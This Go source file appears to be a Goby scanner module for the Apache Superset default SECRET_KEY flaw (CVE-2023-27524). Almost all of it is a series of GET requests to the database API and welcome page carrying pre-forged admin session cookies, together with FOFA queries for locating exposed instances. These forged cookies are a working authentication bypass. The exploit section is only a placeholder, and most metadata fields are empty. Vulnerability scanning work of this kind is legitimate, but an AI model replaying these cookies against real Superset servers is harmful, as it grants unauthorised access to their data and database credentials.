package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Apache Superset 默认SECRET_KEY 漏洞（CVE-2023-27524）",
  "Description": "",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": null,
  "Author": "清晨",
  "FofaQuery": "app=\"APACHE-Superset\" || product=\"APACHE-Superset\" || body=\"Superset\"",
  "GobyQuery": "app=\"APACHE-Superset\" || product=\"APACHE-Superset\" || body=\"Superset\"",
  "Level": "2",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "GET",
        "uri": "/api/v1/database/1",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE5_mg.FvYyXJsdj5DrpNpJngoA7efRanc"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "\"database_name\"",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/api/v1/database/1",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE5_tw.b6454ql-fyJMBqIk6qiq_E0SPgI"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "\"database_name\"",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/api/v1/database/1",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE5_4Q.s2kzYxXp6-8I632vtgoiuQJ81us"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "\"database_name\"",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/superset/welcome/",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE5__Q.JluJC6WODfntxW5n_mpQnq1g_8Y"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "Superset",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/api/v1/database/1",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE6ALw.jJ_52EMd2iBxx000oy64mwlAX3I"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "\"database_name\"",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/superset/welcome/",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE5_tw.b6454ql-fyJMBqIk6qiq_E0SPgI"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "Superset",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/superset/welcome/",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE5_mg.FvYyXJsdj5DrpNpJngoA7efRanc"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "Superset",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/superset/welcome/",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE5_4Q.s2kzYxXp6-8I632vtgoiuQJ81us"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "Superset",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/superset/welcome/",
        "follow_redirect": false,
        "header": {
          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE6ALw.jJ_52EMd2iBxx000oy64mwlAX3I"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "Superset",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Apache Superset 默认SECRET_KEY 漏洞（CVE-2023-27524）",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "Apache Superset default SECRET_KEY CVE-2023-27524",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}